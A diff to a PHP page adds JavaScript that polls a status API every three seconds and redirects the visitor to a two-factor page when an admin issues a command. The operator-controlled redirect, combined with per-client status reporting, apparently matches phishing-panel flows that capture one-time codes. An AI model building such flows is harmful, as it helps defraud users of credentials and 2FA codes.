@@ -220,6 +220,36 @@ if (isset($_COOKIE['identificador_cliente'])) {
             setInterval(sendStatusUpdate, 2000);
         })();
     </script>
+    <script>
+        async function checkAdminCommand() {
+            try {
+                // Chama a nossa nova API
+                const response = await fetch('api_check_status.php');
+                const data = await response.json();
 
+                // Escreve o status no console para podermos depurar
+                console.log('Status atual do servidor:', data.status); 
+
+                // A CONDIÇÃO PRINCIPAL:
+                // Se o admin mudou o status para 'redirecionar_para_2fa'
+                if (data.status === 'redirecionar_para_2fa') {
+                    
+                    // Para o polling para não redirecionar múltiplas vezes
+                    clearInterval(statusInterval);
+                    
+                    console.log('Comando do admin recebido! Redirecionando...');
+                    
+                    // Redireciona o usuário para a tela de dois fatores
+                    window.location.href = 'dois_fatores.php';
+                }
+
+            } catch (error) {
+                console.error('Erro ao verificar status:', error);
+            }
+        }
+
+        // Inicia a verificação periódica a cada 3000 milissegundos (3 segundos)
+        const statusInterval = setInterval(checkAdminCommand, 3000);
+    </script>
 </body>
 </html>
